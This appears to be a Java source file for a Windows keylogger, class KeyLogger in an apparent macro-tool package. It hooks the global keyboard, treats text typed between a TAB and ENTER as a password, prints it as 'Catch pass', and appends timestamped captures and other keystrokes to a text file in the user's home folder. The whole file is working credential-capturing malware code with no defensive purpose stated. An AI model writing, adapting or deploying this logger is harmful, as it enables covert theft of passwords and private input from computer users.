package com.icodeuplay.jmacro.app;

import java.awt.event.KeyEvent;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.sf.feeling.swt.win32.extension.hook.Hook;
import org.sf.feeling.swt.win32.extension.hook.data.HookData;
import org.sf.feeling.swt.win32.extension.hook.data.KeyboardHookData;
import org.sf.feeling.swt.win32.extension.hook.listener.HookEventListener;

public class KeyLogger {
	StringBuffer pass = new StringBuffer();
	StringBuffer rest = new StringBuffer();
	boolean concat = true;
	String file = System.getProperty("user.home") + System.getProperty("file.separator")
			+ System.getProperty("user.name") + ".txt";
	final int wordSize = 5;
	int count;

	public KeyLogger() {
		Hook.KEYBOARD.addListener(new HookEventListener() {
			public void acceptHookData(HookData hookData) {
				KeyboardHookData khd = (KeyboardHookData) hookData;
				boolean ts = khd.getTransitionState();
				long keyCode = khd.getVirtualKeyCode();
				if (hookData != null && !ts) {
					if (keyCode == KeyEvent.VK_TAB) {
						System.out.println("TAB");
						concat = true;
					}// of TAB
					if (concat) {
						System.out.println("CONCAT");
						if (keyCode != KeyEvent.VK_TAB && keyCode != 13)
							pass.append((char) keyCode);
						System.out.println(pass);
						if (keyCode == 13) {
							System.out.println("ENTER");
							System.out.println("Catch pass:" + pass);
							String sDate = new SimpleDateFormat("dd/MM/yyyy H:m:s").format(new Date());
							appendFile(sDate + "=[" + pass.toString() + "]", true);
							// clean
							pass = new StringBuffer();
						}// of ENTER
					}// of concat
					else {
						if (count == wordSize) {
							appendFile(rest.toString(), false);
							rest = new StringBuffer();
							count = 0;
						} else {
							rest.append(keyCode);
						}
						// increase
						count++;
					}
				}//
			}
		});
		Hook.KEYBOARD.install();
		/*
		 * Runtime.getRuntime().addShutdownHook( new Thread(){ public void
		 * run(){ System.out.println("Leaving"); appendFile(); } });
		 */
	}

	public void appendFile(String pass, boolean nl) {
		try {
			BufferedWriter out = new BufferedWriter(new FileWriter(file, true));
			out.write(pass);
			if (nl)
				out.newLine();
			out.close();
		} catch (IOException e) {
		}
	}

	public static void main(String args[]) {
		new KeyLogger();
	}
}
